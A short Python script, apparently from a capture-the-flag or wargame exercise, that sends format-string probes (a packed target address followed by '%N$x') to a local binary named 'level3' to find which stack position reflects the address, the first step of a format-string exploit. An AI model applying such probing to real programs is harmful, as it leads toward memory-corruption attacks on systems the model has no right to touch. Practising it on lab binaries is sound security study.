import struct
import subprocess

m_addr = 0x0804988c

def build_payload(param_num):
    addr = struct.pack("<I", m_addr)
    payload = addr + b"." + b"%" + str(param_num).encode() + b"$x" + b".\n"
    return payload

def test_positions(max_pos=15):
    for i in range(1, max_pos + 1):
        payload = build_payload(i)
        p = subprocess.Popen(["./level3"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(input=payload)
        output_str = out.decode('utf-8', errors='ignore').strip()
        print("Position {}: output = {}".format(i, output_str))

if __name__ == "__main__":
    test_positions()
